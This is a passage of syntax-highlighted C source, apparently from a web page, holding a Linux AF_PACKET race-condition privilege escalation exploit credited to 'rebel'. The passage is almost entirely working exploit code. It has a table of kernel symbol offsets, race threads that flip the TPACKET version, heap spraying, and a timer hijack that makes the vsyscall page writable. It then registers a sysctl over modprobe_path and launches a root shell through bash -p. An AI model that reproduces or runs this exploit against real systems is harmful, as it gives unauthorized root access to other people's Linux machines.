class="string">"4.4.0-28-generic #47~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273b70</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.9.0-1-generic #2"</span>,<span class="number">0xffffffff8108bbe0</span>,<span class="number">0xffffffff81e4ac20</span>,<span class="number">0xffffffff812b8400</span>,<span class="number">0xffffffff8106f390</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-28-generic #30"</span>,<span class="number">0xffffffff8108ae10</span>,<span class="number">0xffffffff81e48b80</span>,<span class="number">0xffffffff812b3690</span>,<span class="number">0xffffffff8106f0e0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-35-generic #40~14.04.1"</span>,<span class="number">0xffffffff8107fff0</span>,<span class="number">0xffffffff81c49960</span>,<span class="number">0xffffffff81262320</span>,<span class="number">0xffffffff81069d20</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-27-generic #32"</span>,<span class="number">0xffffffff810820c0</span>,<span class="number">0xffffffff81c487c0</span>,<span class="number">0xffffffff81274150</span>,<span class="number">0xffffffff8106b620</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-42-generic #62"</span>,<span class="number">0xffffffff81087fc0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812874a0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-51-generic #72"</span>,<span class="number">0xffffffff81088090</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812879a0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line"><span class="comment">//&#123;"4.8.6-300.fc25.x86_64 #1 SMP Tue Nov 1 12:36:38 UTC 2016",0xffffffff9f0a8b30,0xffffffff9fe40940,0xffffffff9f2cfbf0,0xffffffff9f0663b0&#125;,</span></span><br><span class="line">    &#123;<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VSYSCALL 0xffffffffff600000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAD 64</span></span><br><span class="line"><span class="keyword">int</span> pad_fds[PAD];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *procname;</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">int</span> maxlen;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> *<span class="title">child</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *proc_handler;</span><br><span class="line">    <span class="keyword">void</span> *poll;</span><br><span class="line">    <span class="keyword">void</span> *extra1;</span><br><span class="line">    <span class="keyword">void</span> *extra2;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONF_RING_FRAMES 1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">tp</span>;</span></span><br><span class="line"><span class="keyword">int</span> sfd;</span><br><span class="line"><span class="keyword">int</span> mapped = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *prev;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>           expires;</span><br><span class="line">    <span class="keyword">void</span>                    (*function)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>           data;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>                     flags;</span><br><span class="line">    <span class="keyword">int</span>                     slack;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">setsockopt_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(barrier) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (<span class="keyword">void</span>*) &amp;tp, <span class="keyword">sizeof</span>(tp));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">vers_switcher</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val,x,y;</span><br><span class="line">    <span class="keyword">while</span>(barrier) &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        val = TPACKET_V1;</span><br><span class="line">        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">        y++;</span><br><span class="line">        <span class="keyword">if</span>(x != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        val = TPACKET_V3;</span><br><span class="line">        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">        <span class="keyword">if</span>(x != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        y++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"version switcher stopping, x = %d (y = %d, last val = %d)\n"</span>,x,y,val);</span><br><span class="line">    vers_switcher_done = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 1408</span></span><br><span class="line"><span class="keyword">char</span> exploitbuf[BUFSIZE];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        syscall(__NR_add_key, <span class="string">"user"</span>,<span class="string">"wtf"</span>,exploitbuf,BUFSIZE<span class="number">-24</span>,<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pad_kmalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(x=<span class="number">0</span>; x&lt;PAD; x++)</span><br><span class="line">        <span class="keyword">if</span>(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"pad_kmalloc() socket error\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">try_exploit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> func, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg, <span class="keyword">void</span> *verification_func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> setsockopt_thread_thread,a;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="keyword">socklen_t</span> l;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> *<span class="title">timer</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_block_desc</span> *<span class="title">pbd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> off;</span><br><span class="line">    <span class="keyword">sigset_t</span> <span class="built_in">set</span>;</span><br><span class="line">    sigemptyset(&amp;<span class="built_in">set</span>);</span><br><span class="line">    sigaddset(&amp;<span class="built_in">set</span>, SIGSEGV);</span><br><span class="line">    <span class="keyword">if</span>(pthread_sigmask(SIG_BLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"couldn't set sigmask\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"new exploit attempt starting, jumping to %p, arg=%p\n"</span>,(<span class="keyword">void</span> *)func,(<span class="keyword">void</span> *)arg);</span><br><span class="line">    pad_kmalloc();</span><br><span class="line">    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));</span><br><span class="line">    <span class="keyword">if</span> (fd==<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"target socket error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pad_kmalloc();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"sockets allocated\n"</span>);</span><br><span class="line">    val = TPACKET_V3;</span><br><span class="line">    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();</span><br><span class="line">    tp.tp_block_nr = <span class="number">1</span>;</span><br><span class="line">    tp.tp_frame_size = getpagesize();</span><br><span class="line">    tp.tp_frame_nr = CONF_RING_FRAMES;</span><br><span class="line"><span class="comment">//try to set the timeout to 10 seconds</span></span><br><span class="line"><span class="comment">//the default timeout might still be used though depending on when the race was won</span></span><br><span class="line">    tp.tp_retire_blk_tov = <span class="number">10000</span>;</span><br><span class="line">    sfd = fd;</span><br><span class="line">    <span class="keyword">if</span>(pthread_create(&amp;setsockopt_thread_thread, <span class="literal">NULL</span>, setsockopt_thread, (<span class="keyword">void</span> *)<span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error creating thread\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_create(&amp;a, <span class="literal">NULL</span>, vers_switcher, (<span class="keyword">void</span> *)<span class="literal">NULL</span>);</span><br><span class="line">    usleep(<span class="number">200000</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"removing barrier and spraying..\n"</span>);</span><br><span class="line">    memset(exploitbuf,'\x00',BUFSIZE);</span><br><span class="line">    timer = (struct timer_list *)(exploitbuf+(<span class="number">0x6c</span>*<span class="number">8</span>)+<span class="number">6</span><span class="number">-8</span>);</span><br><span class="line">    timer-&gt;next = <span class="number">0</span>;</span><br><span class="line">    timer-&gt;prev = <span class="number">0</span>;</span><br><span class="line">    timer-&gt;expires = <span class="number">4294943360</span>;</span><br><span class="line">    timer-&gt;function = (<span class="keyword">void</span> *)func;</span><br><span class="line">    timer-&gt;data = arg;</span><br><span class="line">    timer-&gt;flags = <span class="number">1</span>;</span><br><span class="line">    timer-&gt;slack = <span class="number">-1</span>;</span><br><span class="line">    barrier = <span class="number">0</span>;</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">    <span class="keyword">while</span>(!vers_switcher_done)usleep(<span class="number">100000</span>);</span><br><span class="line">    l = <span class="keyword">sizeof</span>(val);</span><br><span class="line">    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, &amp;l);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"current packet version = %d\n"</span>,val);</span><br><span class="line">    pbd = mmap(<span class="number">0</span>, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pbd == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"could not map pbd\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        off = pbd-&gt;hdr.bh1.offset_to_first_pkt;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"pbd-&gt;hdr.bh1.offset_to_first_pkt = %d\n"</span>,off);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(val == TPACKET_V1 &amp;&amp; off != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"race not won\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);</span><br><span class="line">    pthread_create(&amp;a, <span class="literal">NULL</span>, verification_func, (<span class="keyword">void</span> *)<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\n"</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"closing socket and verifying.."</span>);</span><br><span class="line">    close(sfd);</span><br><span class="line">    kmalloc();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"all messages sent\n"</span>);</span><br><span class="line">    sleep(<span class="number">31337</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> verification_result = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">catch_sigsegv</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    verification_result = <span class="number">0</span>;</span><br><span class="line">    pthread_exit((<span class="keyword">void</span> *)<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">modify_vsyscall</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *vsyscall = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(VSYSCALL+<span class="number">0x850</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> x = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="keyword">sigset_t</span> <span class="built_in">set</span>;</span><br><span class="line">    sigemptyset(&amp;<span class="built_in">set</span>);</span><br><span class="line">    sigaddset(&amp;<span class="built_in">set</span>, SIGSEGV);</span><br><span class="line">    <span class="keyword">if</span>(pthread_sigmask(SIG_UNBLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"couldn't set sigmask\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGSEGV, catch_sigsegv);</span><br><span class="line">    *vsyscall = <span class="number">0xdeadbeef</span>+x;</span><br><span class="line">    <span class="keyword">if</span>(*vsyscall == <span class="number">0xdeadbeef</span>+x) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nvsyscall page altered!\n"</span>);</span><br><span class="line">        verification_result = <span class="number">1</span>;</span><br><span class="line">        pthread_exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">verify_stage1</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">pthread_t</span> v_thread;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span>(x=<span class="number">0</span>; x&lt;<span class="number">300</span>; x++) &#123;</span><br><span class="line">        pthread_create(&amp;v_thread, <span class="literal">NULL</span>, modify_vsyscall, <span class="number">0</span>);</span><br><span class="line">        pthread_join(v_thread, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(verification_result == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        write(<span class="number">2</span>,<span class="string">"."</span>,<span class="number">1</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"could not modify vsyscall\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">verify_stage2</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">b</span>;</span></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span>(x=<span class="number">0</span>; x&lt;<span class="number">300</span>; x++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(stat(<span class="string">"/proc/sys/hack"</span>,&amp;b) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nsysctl added!\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        write(<span class="number">2</span>,<span class="string">"."</span>,<span class="number">1</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"could not add sysctl\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> func, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg, <span class="keyword">void</span> *verification_func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">retry:</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        try_exploit(func, arg, verification_func);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(WEXITSTATUS(status) == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"retrying stage..\n"</span>);</span><br><span class="line">        kill(pid, <span class="number">9</span>);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(WEXITSTATUS(status) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"something bad happened, aborting exploit attempt\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    kill(pid, <span class="number">9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wrapper</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"exploit starting\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"making vsyscall page writable..\n\n"</span>);</span><br><span class="line">    exploit(off-&gt;set_memory_rw, VSYSCALL, verify_stage1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nstage 1 completed\n"</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"registering new sysctl..\n\n"</span>);</span><br><span class="line">    c = (struct ctl_table *)(VSYSCALL+<span class="number">0x850</span>);</span><br><span class="line">    memset((char *)(VSYSCALL+0x850), '\x00', 1952);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(VSYSCALL+<span class="number">0xf00</span>),<span class="string">"hack"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)(VSYSCALL+<span class="number">0xe00</span>),<span class="string">"\x01\x00\x00\x00"</span>,<span class="number">4</span>);</span><br><span class="line">    c-&gt;procname = (<span class="keyword">char</span> *)(VSYSCALL+<span class="number">0xf00</span>);</span><br><span class="line">    c-&gt;mode = <span class="number">0666</span>;</span><br><span class="line">    c-&gt;proc_handler = (<span class="keyword">void</span> *)(off-&gt;proc_dostring);</span><br><span class="line">    c-&gt;data = (<span class="keyword">void</span> *)(off-&gt;modprobe_path);</span><br><span class="line">    c-&gt;maxlen=<span class="number">256</span>;</span><br><span class="line">    c-&gt;extra1 = (<span class="keyword">void</span> *)(VSYSCALL+<span class="number">0xe00</span>);</span><br><span class="line">    c-&gt;extra2 = (<span class="keyword">void</span> *)(VSYSCALL+<span class="number">0xd00</span>);</span><br><span class="line">    exploit(off-&gt;register_sysctl_table, VSYSCALL+<span class="number">0x850</span>, verify_stage2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stage 2 completed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_rootshell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">s</span>;</span></span><br><span class="line">    fd = open(<span class="string">"/proc/sys/hack"</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"could not open /proc/sys/hack\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(buf,'\x00', 256);</span><br><span class="line">    readlink(<span class="string">"/proc/self/exe"</span>,(<span class="keyword">char</span> *)&amp;buf,<span class="number">256</span>);</span><br><span class="line">    write(fd,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">    socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br><span class="line">    <span class="keyword">if</span>(stat(buf,&amp;s) == <span class="number">0</span> &amp;&amp; s.st_uid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"binary executed by kernel, launching rootshell\n"</span>);</span><br><span class="line">        lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">        write(fd,<span class="string">"/sbin/modprobe"</span>,<span class="number">15</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        execl(buf,buf,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not create rootshell\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">utsname</span> <span class="title">u</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, crash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">512</span>], *f;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"crash"</span>)) &#123;</span><br><span class="line">        crash = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span> &amp;&amp; geteuid() == <span class="number">0</span> &amp;&amp; !crash) &#123;</span><br><span class="line">        chown(<span class="string">"/proc/self/exe"</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        chmod(<span class="string">"/proc/self/exe"</span>,<span class="number">06755</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(getuid() != <span class="number">0</span> &amp;&amp; geteuid() == <span class="number">0</span> &amp;&amp; !crash) &#123;</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        setresgid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">"/bin/bash"</span>,<span class="string">"bash"</span>,<span class="string">"-p"</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"linux AF_PACKET race condition exploit by rebel\n"</span>);</span><br><span class="line">    uname(&amp;u);</span><br><span class="line">    <span class="keyword">if</span>((f = <span class="built_in">strstr</span>(u.version,<span class="string">"-Ubuntu"</span>)) != <span class="literal">NULL</span>) *f = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf,<span class="number">512</span>,<span class="string">"%s %s"</span>,u.release,u.version);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"kernel version: %s\n"</span>,buf);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; offsets[i].kernel_version != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(offsets[i].kernel_version,buf)) &#123;</span><br><span class="line">            <span class="keyword">while</span>(offsets[i].proc_dostring == <span class="number">0</span>)</span><br><span class="line">                i--;</span><br><span class="line">            off = &amp;offsets[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(crash) &#123;</span><br><span class="line">        off = &amp;offsets[<span class="number">0</span>];</span><br><span class="line">        off-&gt;set_memory_rw = <span class="number">0xffffffff41414141</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(off) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"proc_dostring = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;proc_dostring);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"modprobe_path = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;modprobe_path);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"register_sysctl_table = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;register_sysctl_table);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"set_memory_rw = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;set_memory_rw);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!off) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"i have no offsets for this kernel version..\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(unshare(CLONE_NEWUSER) != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"failed to create new user namespace\n"</span>);</span><br><span class="line">        <span 